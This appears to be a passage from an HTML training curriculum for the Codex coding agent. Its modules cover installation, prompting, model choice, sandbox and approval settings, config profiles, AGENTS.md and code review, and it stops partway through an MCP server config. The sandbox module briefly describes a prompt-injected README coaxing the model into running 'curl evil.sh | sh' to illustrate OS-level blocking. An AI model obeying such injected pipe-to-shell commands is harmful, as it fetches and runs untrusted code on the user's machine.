+<blockquote class="callout"><p><strong>Note:</strong> Phase 2 (Control &amp; Safety) is the hub. Phase 3 (Extending) and Phase 4 (Automation) are independent of each other — take them in either order once 2.1 is done.</p></blockquote>
+
+<h2 id="learning-tracks">Learning Tracks (Curated Paths)</h2>
+<p>Pick a track based on your goal. Each is a valid subset.</p>
+<h3 id="track-1-daily-driver">Track 1 — Daily Driver (use Codex well every day)</h3>
+<p><code>1.1 → 1.2 → 1.3 → 2.1 → 2.3 → 2.4 → Phase 1 Capstone</code><br>
+Target outcome: <strong>Codex as your default pair programmer, with safe defaults</strong></p>
+<h3 id="track-2-safe-team-rollout">Track 2 — Safe Team Rollout (standardize Codex for a repo)</h3>
+<p><code>2.1 → 2.2 → 2.3 → 3.3 → 4.2 → Phase 2 Capstone</code><br>
+Target outcome: <strong>A checked-in AGENTS.md, rules, and CI review that any teammate inherits</strong></p>
+<h3 id="track-3-automation-engineer">Track 3 — Automation Engineer (Codex without a human at the keyboard)</h3>
+<p><code>1.2 → 2.1 → 4.1 → 4.2 → 4.3 → Phase 4 Capstone</code><br>
+Target outcome: <strong>Scripted, schema-validated Codex runs in CI and in your own services</strong></p>
+<h3 id="track-4-switching-from-claude-code">Track 4 — Switching from Claude Code (map what you already know)</h3>
+<p><code>1.1 → 1.4 → 2.1 → 2.3 → 3.1 → 3.2 → 3.3 → Final Capstone</code><br>
+Target outcome: <strong>Run the same DevToolkit workflow in either agent; know where the two differ</strong></p>
+
+<h2 id="roadmap-overview">Roadmap Overview</h2>
+<pre><code>Phase 1 — Foundations           (Weeks 1–2)
+Phase 2 — Control &amp; Safety      (Weeks 3–4)
+Phase 3 — Extending Codex       (Weeks 5–6)
+Phase 4 — Automation            (Weeks 7–8)
+Final Capstone                  (Week 9+)</code></pre>
+<p><strong>Dependency map:</strong></p>
+<pre><code>1.1 ── 1.2 ─┬─ 1.3 ─┬─ 2.3 ─┬─ 3.2
+            │       │       └─ 3.4
+            │       └─ 2.4
+            ├─ 1.4
+            └─ 2.1 ─┬─ 2.2 ─┬─ 3.1
+                    │       └─ 3.3
+                    └─ 4.1 ─┬─ 4.2 ─┐
+                            └─ 4.3 ─┴─ Final Capstone</code></pre>
+
+<h2 id="phase-1-foundations">Phase 1: Foundations</h2>
+<h3 id="weeks-1-2">Weeks 1–2 | Goal: run Codex confidently on a real repo and get useful, reviewable changes</h3>
+<hr />
+
+<h3 id="module-11-what-codex-is">Module 1.1 — What Codex Is</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Beginner · <strong>Prereqs:</strong> None · <strong>Time:</strong> ~2h<br>
+<strong>Skip-check (test-out):</strong> Explain, without notes, when you would use the CLI versus a cloud task, and which plan tier lacks cloud features.<br>
+<strong>Skip if:</strong> You already use Codex across at least two surfaces.<br>
+<strong>Unlocks:</strong> 1.2, 1.4</p>
+</blockquote>
+<h4>One agent, several surfaces</h4>
+<p>Codex is a single coding agent you reach through several front ends. They share the same agent and, locally, the same configuration in <code>~/.codex/</code> — so what you learn in the CLI transfers to the IDE extension. Knowing which surface runs <em>where</em> matters because it decides which files and secrets the agent can touch.</p>
+<table>
+<tr><th>Surface</th><th>Runs on</th><th>Best for</th></tr>
+<tr><td>Codex CLI (<code>codex</code>)</td><td>Your machine, in a terminal</td><td>Interactive work in a local repo; scripting with <code>codex exec</code></td></tr>
+<tr><td>IDE extension</td><td>Your machine, inside VS Code (and forks such as Cursor and Windsurf) or JetBrains IDEs</td><td>Editing with open-file context; handing work off to the cloud</td></tr>
+<tr><td>ChatGPT desktop / web / mobile app</td><td>Desktop: your machine; web and mobile: OpenAI's cloud</td><td>Managing many parallel chats, reviewing cloud results</td></tr>
+<tr><td>Codex cloud</td><td>Isolated OpenAI-managed containers</td><td>Long or parallel tasks against a GitHub repo while you do something else</td></tr>
+<tr><td>GitHub <code>@codex</code></td><td>Codex cloud</td><td>PR review and fix requests from pull-request comments</td></tr>
+<tr><td><code>codex exec</code>, GitHub Action, SDK</td><td>Wherever you run them (CI, servers)</td><td>Automation with no human at the keyboard</td></tr>
+</table>
+<h4>The agent loop</h4>
+<p>Every Codex turn is the same loop: read context (your prompt, AGENTS.md, files) → plan → run tools (shell commands, file edits, MCP tools) inside a sandbox → observe results → repeat until done or blocked → report. The sandbox and approval policy (Module 2.1) sit between "run tools" and your machine. If you remember one thing: <strong>Codex acts, it does not just suggest</strong> — so its permissions matter more than its prose.</p>
+<h4>Plans and access</h4>
+<p>Codex is included with ChatGPT plans (Free, Go, Plus, Pro, Business, Enterprise &amp; Edu, with limits that grow by tier) and can also run on an OpenAI API key. API-key use covers the CLI, IDE, <code>codex exec</code> and SDK, but <strong>not</strong> Codex cloud features — cloud tasks need a ChatGPT sign-in. Check the current plan page before budgeting; limits change often.</p>
+<h4>Mapping from Claude Code</h4>
+<p>If you already use Claude Code, most concepts have a direct counterpart. Learning the mapping first prevents the most common switching error: putting instructions in the wrong file and wondering why the agent ignores them.</p>
+<pre class="artifact" data-kind="FRAMEWORK"><code>Claude Code                          OpenAI Codex
+-----------------------------------  -----------------------------------------------
+CLAUDE.md                            AGENTS.md (global ~/.codex/AGENTS.md + repo files)
+~/.claude/settings.json              ~/.codex/config.toml (TOML, not JSON)
+.claude/settings.json (project)      .codex/config.toml (loaded only for trusted projects)
+Permission modes                     sandbox_mode + approval_policy (two separate axes)
+.mcp.json / claude mcp add           [mcp_servers.&lt;id&gt;] tables in config.toml
+Skills (.claude/skills/*/SKILL.md)   Skills (.agents/skills/*/SKILL.md)
+Hooks (settings.json "hooks")        hooks.json or [hooks] in config.toml, features.hooks
+claude -p "..."                      codex exec "..."
+claude --resume / --continue         codex resume / codex exec resume --last
+Claude Agent SDK                     Codex SDK (@openai/codex-sdk)
+anthropics/claude-code-action        openai/codex-action@v1</code></pre>
+<blockquote class="callout"><p><strong>Common mistake:</strong> treating "sandbox" and "approvals" as one setting. In Codex they are independent: the <em>sandbox</em> says what a command is technically able to touch; the <em>approval policy</em> says when Codex must stop and ask you. A permissive sandbox with <code>never</code> approvals is the risky combination — not either setting alone.</p></blockquote>
+<p><strong>Exercise 1.1 — Choose the Surface</strong></p>
+<p>Dataset: DevToolkit (TypeScript + Express + Prisma REST API)</p>
+<ol>
+<li>Write one sentence each on which surface you'd use for: adding a <code>/health</code> endpoint, a 40-minute refactor of DevToolkit's auth layer while you're in a meeting, and reviewing a teammate's PR.</li>
+<li>List which DevToolkit secrets (database URL, JWT secret) each surface could reach. Note which ones never leave your machine.</li>
+<li>Decide whether you'll sign in with ChatGPT or an API key, and write down which features that choice gives up.</li>
+<li>If you use Claude Code, copy the mapping table above into DevToolkit's <code>docs/</code> notes and add one row of your own.</li>
+</ol>
+<hr />
+
+<h3 id="module-12-install-sign-in-first-session">Module 1.2 — Install, Sign In, First Session</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Beginner · <strong>Prereqs:</strong> 1.1 · <strong>Time:</strong> ~2h<br>
+<strong>Skip-check (test-out):</strong> <code>codex --version</code> prints 0.171.0 or later, and you have completed a session that edited a file.<br>
+<strong>Skip if:</strong> Codex is installed, current, and signed in.<br>
+<strong>Unlocks:</strong> 1.3, 1.4, 2.1</p>
+</blockquote>
+<h4>Install</h4>
+<p>Pick one installer and stick with it; mixing npm and Homebrew installs leaves two <code>codex</code> binaries on your PATH, and you end up updating the one you aren't running.</p>
+<pre><code class="language-bash"># npm (Node 18+)
+npm install -g @openai/codex
+
+# or Homebrew (macOS)
+brew install --cask codex
+
+# or the standalone installer
+curl -fsSL https://chatgpt.com/codex/install.sh | sh
+
+# confirm which binary runs and its version
+which codex &amp;&amp; codex --version
+
+# update later with the same tool you installed with
+npm install -g @openai/codex        # npm
+brew upgrade --cask codex           # Homebrew</code></pre>
+<h4>Sign in</h4>
+<p>Run <code>codex</code> and choose <strong>Sign in with ChatGPT</strong>, or set an API key for headless use. Credentials land in <code>~/.codex/auth.json</code>; treat that file like a password — anyone who copies it can spend your plan's usage.</p>
+<pre><code class="language-bash"># interactive: opens a browser sign-in on first run
+codex
+
+# headless / CI: API key via environment variable (supported by codex exec and the SDK)
+export CODEX_API_KEY="sk-..."   # set in your shell profile or a secret manager, never in the repo
+
+# keep the credentials file private
+chmod 600 ~/.codex/auth.json</code></pre>
+<h4>First session on DevToolkit</h4>
+<p>Start Codex from the repo root. Codex treats the directory you launch from as the workspace, so launching from <code>~</code> gives it your whole home directory as context and as a write target.</p>
+<pre><code class="language-bash">mkdir devtoolkit &amp;&amp; cd devtoolkit &amp;&amp; git init
+codex "Scaffold a Node 20 + TypeScript (strict) Express app. Add GET /health returning {\"status\":\"ok\"}, a Vitest + Supertest test for it, and npm scripts dev, build, test. Run the tests before you finish."</code></pre>
+<p>Watch the transcript: each shell command Codex proposes, each file it edits, and the final summary. Commit before every new task — git is your undo button, independent of Codex's own <code>/undo</code>.</p>
+<p><strong>Exercise 1.2 — Bootstrap DevToolkit</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Install Codex with one installer and record <code>which codex</code> and <code>codex --version</code>.</li>
+<li>Sign in and confirm <code>~/.codex/auth.json</code> has mode 600.</li>
+<li>Run the scaffold prompt above inside an empty <code>devtoolkit/</code> repo.</li>
+<li>Run <code>npm test</code> yourself; don't trust the summary alone.</li>
+<li>Commit with message <code>feat: scaffold devtoolkit with health check</code>.</li>
+<li>Note one command Codex asked approval for and why it needed to ask.</li>
+</ol>
+<hr />
+
+<h3 id="module-13-prompting-and-plan-mode">Module 1.3 — Prompting and Plan Mode</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Beginner · <strong>Prereqs:</strong> 1.2 · <strong>Time:</strong> ~3h<br>
+<strong>Skip-check (test-out):</strong> Get Codex to add a validated POST endpoint in one prompt, with tests passing and no follow-up corrections.<br>
+<strong>Skip if:</strong> Your prompts routinely include scope, constraints, and a verification step.<br>
+<strong>Unlocks:</strong> 2.3, 2.4</p>
+</blockquote>
+<h4>The four-part task prompt</h4>
+<p>Codex fills gaps with guesses. Every unspecified decision (library, file location, error shape) is a coin flip you'll pay for in review. A good task prompt removes the coin flips.</p>
+<pre class="artifact" data-kind="TEMPLATE"><code>GOAL     Add POST /users to DevToolkit that creates a user.
+CONTEXT  Routes live in src/routes/. Prisma client is in src/lib/db.ts.
+         Follow the pattern in src/routes/health.ts.
+RULES    Validate the body with Zod (email, password min 12 chars).
+         Hash with bcryptjs, 12 rounds. Never return the password hash.
+         Errors use the shape { error: string, code?: string }.
+DONE     npm test passes, including new tests for: valid create (201),
+         invalid email (400), duplicate email (409).
+         Show me the diff summary when finished.</code></pre>
+<h4>Plan mode for multi-step work</h4>
+<p>For anything touching more than two or three files, ask for a plan first. Use <code>/plan</code> (or <strong>Shift+Tab</strong> in the CLI) so Codex proposes steps without editing. Reviewing a ten-line plan costs a minute; reviewing a wrong 400-line diff costs an hour.</p>
+<pre class="artifact" data-kind="SCRIPT"><code>/plan Add JWT auth to DevToolkit: POST /auth/login issues a 24h token,
+a requireAuth middleware protects GET /users. List files you will create
+or change, new dependencies, and the tests you will add. Do not edit yet.
+
+(review the plan, then:)
+Go ahead with steps 1-3 only. Stop after the middleware tests pass.</code></pre>
+<h4>Steering mid-task</h4>
+<p>You can type while Codex works to redirect it; press <strong>Esc</strong> to interrupt a run that's heading the wrong way. Interrupt early — every extra step it takes on a wrong path is a step you must review and revert.</p>
+<p><strong>Exercise 1.3 — Users Endpoint</strong></p>
+<p>Dataset: DevToolkit</p>
+<p><em>Retrieval practice: write your four-part prompt from memory before scrolling back to the template. Then compare — any missing part is the part you'll forget under pressure.</em></p>
+<ol>
+<li>Add Prisma with a <code>User</code> model (id, email unique, passwordHash, createdAt, updatedAt, deletedAt).</li>
+<li>Write a four-part prompt for <code>POST /users</code> and <code>GET /users</code> and run it.</li>
+<li>Record how many follow-up corrections you needed.</li>
+<li>Use <code>/plan</code> for the JWT auth change, approve only part of the plan, and finish it in a second turn.</li>
+<li>Interrupt one run deliberately with Esc and redirect it.</li>
+<li>Commit each finished step separately.</li>
+</ol>
+<hr />
+
+<h3 id="module-14-models-and-reasoning-effort">Module 1.4 — Models and Reasoning Effort</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Beginner–Intermediate · <strong>Prereqs:</strong> 1.2 · <strong>Time:</strong> ~2h<br>
+<strong>Skip-check (test-out):</strong> Set a default model and effort in <code>config.toml</code>, override it for one session with <code>/model</code>, and explain the trade-off.<br>
+<strong>Skip if:</strong> You already choose model and effort per task.<br>
+<strong>Unlocks:</strong> 2.2</p>
+</blockquote>
+<h4>Current models (as of 2026-11-22)</h4>
+<p>Codex CLI 0.171.0 added the <strong>GPT-6.2 Sol</strong> and <strong>GPT-6.2 Astra</strong> models to its catalog, with Sol as the default. Use Sol for everyday coding, and switch to Astra for the hardest multi-file reasoning. Older entries (GPT-6.1 Sol and Terra, the GPT-6 family) stay available for a while after a new release. Model lineups change every few months, so always check <code>/model</code> for what your install offers; don't copy model names from blog posts.</p>
+<h4>Reasoning effort</h4>
+<p><code>model_reasoning_effort</code> trades speed and usage for depth. Higher effort helps on ambiguous debugging and design. On mechanical edits it mostly burns usage and time. The available levels depend on the model and client, ranging from <code>low</code> upward through higher tiers. <code>/model</code> shows the levels your current model supports.</p>
+<pre><code class="language-toml"># ~/.codex/config.toml
+model = "gpt-6.2-sol"              # pick the exact slug shown by /model
+model_reasoning_effort = "medium"  # everyday default
+model_reasoning_summary = "concise"
+model_verbosity = "low"            # shorter final messages
+review_model = "gpt-6.2-astra"     # model used by /review
+plan_mode_reasoning_effort = "high"</code></pre>
+<p>In a session, <code>/model</code> switches model and effort for that session without editing the file.</p>
+<pre class="artifact" data-kind="WORKSHEET"><code>Task type                         Model        Effort   Why
+--------------------------------  -----------  -------  --------------------------------
+Rename / format / add a test      Sol          low      Mechanical; speed matters
+New endpoint with known pattern   Sol          medium   Default
+Flaky test, unclear root cause    Astra        high     Needs hypothesis testing
+Cross-cutting auth refactor plan  Astra        high     Plan once, execute at medium
+Code review (/review)             Astra        high     Misses are costly</code></pre>
+<p><strong>Exercise 1.4 — Effort Experiment</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Set the config above, adjusting the slugs to what <code>/model</code> lists.</li>
+<li>Ask Codex to add input validation to <code>GET /users?limit=</code> at <code>low</code> effort, then reset with git and repeat at <code>high</code>.</li>
+<li>Compare time taken, the diff, and whether tests covered edge cases (negative, non-numeric, over max).</li>
+<li>Fill in one new row of the worksheet from your own result.</li>
+<li>Commit the better of the two versions.</li>
+</ol>
+<hr />
+
+<h3 id="phase-1-capstone-scaffold-devtoolkit">Phase 1 Capstone: Scaffold DevToolkit</h3>
+<p><strong>Project: DevToolkit v0.1 — health, users, auth</strong></p>
+<p><strong>Dataset:</strong> DevToolkit</p>
+<p><strong>Deliverables:</strong></p>
+<ol>
+<li>Express + TypeScript strict project with <code>/health</code>, <code>POST /users</code>, <code>GET /users</code> (auth-protected), <code>POST /auth/login</code>.</li>
+<li>Prisma schema with soft-delete <code>deletedAt</code> on <code>User</code>.</li>
+<li>Zod validation on every request body, with errors in the <code>{ error, code? }</code> shape.</li>
+<li>Vitest + Supertest suite passing; at least 10 tests.</li>
+<li>A <code>PROMPTS.md</code> log of every task prompt you used and how many corrections each needed.</li>
+<li>One commit per feature, conventional commit messages.</li>
+</ol>
+<hr />
+
+<h2 id="phase-2-control-and-safety">Phase 2: Control &amp; Safety</h2>
+<h3 id="weeks-3-4">Weeks 3–4 | Goal: decide exactly what Codex may touch, and make it follow your project's rules every time</h3>
+<hr />
+
+<h3 id="module-21-sandbox-and-approvals">Module 2.1 — Sandbox and Approvals</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Beginner–Intermediate · <strong>Prereqs:</strong> 1.2 · <strong>Time:</strong> ~3h<br>
+<strong>Skip-check (test-out):</strong> Configure Codex so it can edit DevToolkit and run tests without prompts, but cannot reach the network or write outside the repo — then prove both limits.<br>
+<strong>Skip if:</strong> You can state the three sandbox modes and the supported approval policies from memory.<br>
+<strong>Unlocks:</strong> 2.2, 3.3, 4.1</p>
+</blockquote>
+<h4>Sandbox modes — what a command <em>can</em> do</h4>
+<table>
+<tr><th><code>sandbox_mode</code></th><th>File writes</th><th>Network</th><th>Use when</th></tr>
+<tr><td><code>read-only</code></td><td>None</td><td>Off</td><td>Exploring, reviewing, answering questions. Default for <code>codex exec</code>.</td></tr>
+<tr><td><code>workspace-write</code></td><td>Workspace (+ <code>writable_roots</code>, temp dirs)</td><td>Off unless <code>network_access = true</code></td><td>Normal coding</td></tr>
+<tr><td><code>danger-full-access</code></td><td>Anywhere your user can write</td><td>On</td><td>Only inside a disposable container or VM</td></tr>
+</table>
+<p>The sandbox is enforced by the OS (Seatbelt on macOS, Linux sandboxing, a native sandbox on Windows), not by the model's good intentions. That's the point: a prompt-injected README can talk the model into trying <code>curl evil.sh | sh</code>, but the sandbox still blocks the network call.</p>
+<h4>Approval policies — when Codex must <em>ask</em></h4>
+<ul>
+<li><code>on-request</code> — Codex runs inside the sandbox freely and asks you when it needs to step outside it (e.g. network, writing outside the workspace). The everyday default.</li>
+<li><code>never</code> — never asks; anything the sandbox blocks simply fails. Right for CI, where nobody is there to answer.</li>
+<li><code>{ granular = { ... } }</code> — per-category control over sandbox approvals, rules prompts, MCP elicitations, permission requests and skill approvals.</li>
+</ul>
+<blockquote class="callout"><p><strong>Version note:</strong> <code>untrusted</code> is no longer supported and <code>on-failure</code> is deprecated; <code>codex exec --full-auto</code> was removed — use <code>--sandbox workspace-write</code> instead. Older tutorials still show these; they will error or warn on current releases.</p></blockquote>
+<pre><code class="language-toml"># ~/.codex/config.toml — sensible everyday baseline
+sandbox_mode = "workspace-write"
+approval_policy = "on-request"
+
+[sandbox_workspace_write]
+network_access = false
+writable_roots = []</code></pre>
+<p>Inside a session, <code>/permissions</code> changes the boundaries for the current run without editing config.</p>
+<h4>Proving the limits</h4>
+<p>Don't assume a setting works — test it. A one-minute test now beats discovering in an incident that a typo made your <code>config.toml</code> silently fall back to defaults.</p>
+<pre><code class="language-bash">cd devtoolkit
+# should fail: network is off in workspace-write
+codex exec --sandbox workspace-write "Run: curl -sS https://example.com and report the exit code"
+
+# should fail: outside the workspace
+codex exec --sandbox workspace-write "Create the file ../outside.txt containing hi, then report whether it worked"
+
+# should succeed: inside the workspace
+codex exec --sandbox workspace-write "Run npm test and report the summary line"</code></pre>
+<p><strong>Exercise 2.1 — Lock the Workspace</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Apply the baseline config above.</li>
+<li>Run the three proof commands and record each result.</li>
+<li>Use <code>/permissions</code> in an interactive session to allow network for one run, install a package (<code>zod</code>), then confirm the next run is back to no network.</li>
+<li>Explain in two sentences why <code>danger-full-access</code> plus <code>never</code> is only acceptable inside a throwaway container.</li>
+<li>Commit nothing from this exercise except the dependency change.</li>
+</ol>
+<hr />
+
+<h3 id="module-22-config-toml-and-profiles">Module 2.2 — config.toml and Profiles</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Intermediate · <strong>Prereqs:</strong> 2.1 · <strong>Time:</strong> ~3h<br>
+<strong>Skip-check (test-out):</strong> Run the same prompt under a <code>safe</code> and a <code>ci</code> profile and show the different sandbox in each transcript.<br>
+<strong>Skip if:</strong> You already maintain multiple profiles and project-scoped config.<br>
+<strong>Unlocks:</strong> 3.1, 3.3</p>
+</blockquote>
+<h4>Where config comes from</h4>
+<ul>
+<li><code>~/.codex/config.toml</code> — your user settings (<code>$CODEX_HOME</code> overrides the <code>~/.codex</code> location).</li>
+<li><code>.codex/config.toml</code> in a repo — project settings, loaded <strong>only if you trust the project</strong>. Trust is recorded in your user config.</li>
+<li>Profiles — separate files at <code>$CODEX_HOME/&lt;name&gt;.config.toml</code>, selected with <code>--profile &lt;name&gt;</code>.</li>
+</ul>
+<p>Why the trust gate: a cloned repo could otherwise ship a <code>.codex/config.toml</code> that grants itself full access. For the same reason, project config cannot set high-risk keys such as <code>model_provider</code>, <code>notify</code>, <code>profile</code> or base URLs.</p>
+<pre><code class="language-toml"># ~/.codex/config.toml
+model = "gpt-6.2-sol"
+model_reasoning_effort = "medium"
+sandbox_mode = "workspace-write"
+approval_policy = "on-request"
+
+[projects."/Users/you/code/devtoolkit"]
+trust_level = "trusted"</code></pre>
+<pre><code class="language-toml"># ~/.codex/ci.config.toml   (use with: codex exec --profile ci "...")
+approval_policy = "never"
+sandbox_mode = "workspace-write"
+model_reasoning_effort = "low"
+
+[sandbox_workspace_write]
+network_access = false</code></pre>
+<pre><code class="language-toml"># devtoolkit/.codex/config.toml   (checked in; applies once trusted)
+model_reasoning_effort = "high"
+review_model = "gpt-6.2-astra"</code></pre>
+<h4>Precedence</h4>
+<p>From weakest to strongest: built-in defaults → user config → trusted project config → selected profile → command-line flags and in-session commands such as <code>/model</code>. When behavior surprises you, run <code>/status</code> to see the effective model, sandbox and approval policy instead of guessing which file won.</p>
+<p><strong>Exercise 2.2 — Two Profiles</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Create the user config, the <code>ci</code> profile, and DevToolkit's project config above.</li>
+<li>Start <code>codex</code> in DevToolkit and run <code>/status</code>; record the effective values.</li>
+<li>Run <code>codex exec --profile ci "List the routes in src/routes"</code> and confirm no approval prompt appears.</li>
+<li>Temporarily set <code>trust_level = "untrusted"</code> and show that the project config stops applying.</li>
+<li>Commit <code>.codex/config.toml</code> to DevToolkit; never commit anything from <code>~/.codex/</code>.</li>
+</ol>
+<hr />
+
+<h3 id="module-23-agents-md-project-instructions">Module 2.3 — AGENTS.md Project Instructions</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Beginner–Intermediate · <strong>Prereqs:</strong> 1.3 · <strong>Time:</strong> ~3h<br>
+<strong>Skip-check (test-out):</strong> A fresh session, given only "add a DELETE /users/:id endpoint", follows your soft-delete, validation and error-shape conventions without being told.<br>
+<strong>Skip if:</strong> Your repo already has an AGENTS.md that Codex follows consistently.<br>
+<strong>Unlocks:</strong> 3.2, 3.4</p>
+</blockquote>
+<h4>Discovery</h4>
+<p>Codex reads <code>~/.codex/AGENTS.md</code> (your personal defaults), then AGENTS.md files from the project root down to the current directory; the file closest to the work wins on conflicts. AGENTS.md is an open format shared by several coding agents, so one file can serve Codex and other agents that support it. Content is capped by <code>project_doc_max_bytes</code>, and anything past the cap is silently dropped. Keep the file short and front-load the rules that matter most.</p>
+<p><code>/init</code> drafts an AGENTS.md from your repo. Treat the draft as a starting point: it describes what <em>is</em>, while you need to add what <em>must be</em>.</p>
+<pre><code class="language-markdown"># AGENTS.md — DevToolkit
+
+## Commands
+- Install: `npm ci`
+- Test: `npm test` (Vitest + Supertest). Run before every finish.
+- Type check: `npx tsc --noEmit`
+- DB: `npx prisma migrate dev` (never `migrate reset` without asking)
+
+## Conventions
+- TypeScript strict. No `any`; use `unknown` and narrow.
+- Validate every request body, query and param with Zod in the route file.
+- Errors: respond `{ error: string, code?: string }` with the correct HTTP status.
+- Users are soft-deleted: set `deletedAt`; all reads filter `deletedAt: null`.
+- Passwords: bcryptjs, 12 rounds. Never log or return `passwordHash`.
+
+## Layout
+- Routes: `src/routes/*.ts`, one router per resource
+- Middleware: `src/middleware/`
+- DB client: `src/lib/db.ts` (import, never instantiate PrismaClient elsewhere)
+
+## Do not
+- Edit `prisma/migrations/` by hand.
+- Add dependencies without saying why in the final message.
+- Commit or push. The human commits.</code></pre>
+<h4>Nested files for local rules</h4>
+<p>Put rules that apply to one area next to that area. A <code>src/routes/AGENTS.md</code> about route conventions is read only when Codex works there, which keeps the root file small and under the byte cap.</p>
+<pre><code class="language-markdown"># src/routes/AGENTS.md
+- Every new route gets a test file in `tests/routes/` with the same name.
+- Mount new routers in `src/app.ts` in alphabetical order.
+- Protected routes use `requireAuth` from `src/middleware/auth.ts`.</code></pre>
+<p><strong>Exercise 2.3 — Encode the Conventions</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Run <code>/init</code>, then rewrite the result using the structure above.</li>
+<li>Add the nested <code>src/routes/AGENTS.md</code>.</li>
+<li>In a new session, prompt only: "Add DELETE /users/:id." Check soft delete, Zod param validation, error shape, and test placement.</li>
+<li>For every convention it missed, tighten one line in AGENTS.md and retry from a clean git state.</li>
+<li>Commit AGENTS.md files with <code>docs: add agent instructions</code>.</li>
+</ol>
+<hr />
+
+<h3 id="module-24-session-control-and-review">Module 2.4 — Session Control and Review</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Beginner–Intermediate · <strong>Prereqs:</strong> 1.3 · <strong>Time:</strong> ~2h<br>
+<strong>Skip-check (test-out):</strong> Resume yesterday's session, fork it to try an alternative, and run <code>/review</code> against <code>main</code>.<br>
+<strong>Skip if:</strong> You use <code>/review</code>, <code>/compact</code>, <code>/fork</code> and <code>codex resume</code> routinely.<br>
+<strong>Unlocks:</strong> 4.2</p>
+</blockquote>
+<h4>The commands you'll use daily</h4>
+<table>
+<tr><th>Command</th><th>What it does</th></tr>
+<tr><td><code>/status</code></td><td>Effective model, sandbox, approvals, context use</td></tr>
+<tr><td><code>/diff</code></td><td>Git diff of the workspace, including untracked files</td></tr>
+<tr><td><code>/review</code></td><td>Code review of uncommitted changes, a commit, or a branch against a base</td></tr>
+<tr><td><code>/compact</code></td><td>Summarize the conversation to free context in long sessions</td></tr>
+<tr><td><code>/new</code></td><td>Fresh conversation in the same CLI session</td></tr>
+<tr><td><code>/fork</code></td><td>Branch the conversation to try another approach without losing this one</td></tr>
+<tr><td><code>/resume</code> · <code>codex resume</code></td><td>Reopen a saved session</td></tr>
+<tr><td><code>/undo</code></td><td>Revert Codex's most recent changes</td></tr>
+<tr><td><code>/model</code> · <code>/permissions</code> · <code>/init</code> · <code>/mcp</code></td><td>Covered in Modules 1.4, 2.1, 2.3, 3.1</td></tr>
+</table>
+<p>Type <code>/</code> in the CLI to see the full list for your version. The command set grows almost every release.</p>
+<h4>A review loop that catches real bugs</h4>
+<p>The agent that wrote the code is the worst reviewer of it. It shares the same blind spots. Review in a <em>new</em> session (or <code>/new</code>) using the stronger <code>review_model</code>, and give it something to check against.</p>
+<pre class="artifact" data-kind="CHECKLIST"><code>Before you commit any Codex change to DevToolkit:
+[ ] /diff — every changed file is one you expected
+[ ] npm test and npx tsc --noEmit pass locally (run them yourself)
+[ ] /new, then /review against main with: "Check against AGENTS.md.
+    Focus on auth bypass, missing deletedAt filters, unvalidated input."
+[ ] No secrets, .env values or passwordHash in diff or logs
+[ ] New dependencies are justified in the final message
+[ ] Commit message is conventional (feat:/fix:/refactor:/test:)</code></pre>
+<p><strong>Exercise 2.4 — Review Before Commit</strong></p>
+<p>Dataset: DevToolkit</p>
+<ol>
+<li>Ask Codex to add <code>PATCH /users/:id</code>. Do not commit.</li>
+<li>Run the checklist above, including <code>/review</code> in a fresh conversation.</li>
+<li>Use <code>/fork</code> to try a second implementation using a shared Zod schema module; compare both diffs.</li>
+<li>Exit, then <code>codex resume</code> the session and finish the better version.</li>
+<li>Use <code>/compact</code> once the session gets long and note what survived the summary.</li>
+</ol>
+<hr />
+
+<h3 id="phase-2-capstone-harden-the-workspace">Phase 2 Capstone: Harden the Workspace</h3>
+<p><strong>Project: A DevToolkit setup any teammate can clone safely</strong></p>
+<blockquote class="callout"><p><strong>Self-check before starting:</strong> Without looking back, can you explain the difference between <code>sandbox_mode</code> and <code>approval_policy</code>, why project config needs trust, and which AGENTS.md wins when two conflict? If any draws a blank, re-read that module first.</p></blockquote>
+<p><strong>Dataset:</strong> DevToolkit</p>
+<p><strong>Deliverables:</strong></p>
+<ol>
+<li>User config with the <code>workspace-write</code> + <code>on-request</code> baseline and DevToolkit marked trusted.</li>
+<li><code>ci</code> and <code>deep</code> (Astra, high effort, read-only) profiles.</li>
+<li>Checked-in <code>.codex/config.toml</code> with project-safe keys only.</li>
+<li>Root and nested AGENTS.md under the byte cap, verified by the DELETE-endpoint test.</li>
+<li>A <code>docs/codex-setup.md</code> explaining how a teammate trusts the project and which profile to use when.</li>
+<li>Evidence (pasted transcripts) that network and out-of-workspace writes are blocked.</li>
+<li>One feature (<code>PATCH /users/:id</code>) shipped through the full review checklist.</li>
+</ol>
+<hr />
+
+<h2 id="phase-3-extending-codex">Phase 3: Extending Codex</h2>
+<h3 id="weeks-5-6">Weeks 5–6 | Goal: give Codex the right tools, reusable procedures, and guardrails — locally and in the cloud</h3>
+<hr />
+
+<h3 id="module-31-mcp-servers">Module 3.1 — MCP Servers</h3>
+<blockquote class="module-meta">
+<p><strong>Level:</strong> Intermediate · <strong>Prereqs:</strong> 2.2 · <strong>Time:</strong> ~3h<br>
+<strong>Skip-check (test-out):</strong> Connect one stdio and one HTTP MCP server, restrict one of them to an allow-list of tools, and show both in <code>/mcp</code>.<br>
+<strong>Skip if:</strong> You already run MCP servers with Codex and scope their tools.<br>
+<strong>Unlocks:</strong> Phase 3 Capstone</p>
+</blockquote>
+<h4>What MCP adds</h4>
+<p>The Model Context Protocol lets Codex call tools that live outside the shell, such as current library docs, GitHub issues, or your database. Each server you add is code that runs with your credentials. Add only servers you would also trust as an npm dependency, and expose only the tools the task needs.</p>
+<h4>Configuring servers in config.toml</h4>
+<pre><code class="language-toml"># ~/.codex/config.toml
+
+# stdio server: up-to-date library docs
+[mcp_servers.context7]
+command = "npx"
+args = ["-y", "@upstash/context7-mcp"]
+startup_timeout_sec = 20
+tool_timeout_sec = 60
+
+# streamable HTTP server: GitHub, token read from an env var (never inline)
+[mcp_servers.github]
+url = "https://api.githubcopilot.com/mcp/"
+bearer_token_env_var = "GITHUB_PAT"
+enabled_tools = ["get_issue", "list_issues", "get_pull_request"]
+
+# keep a server defined but switched off
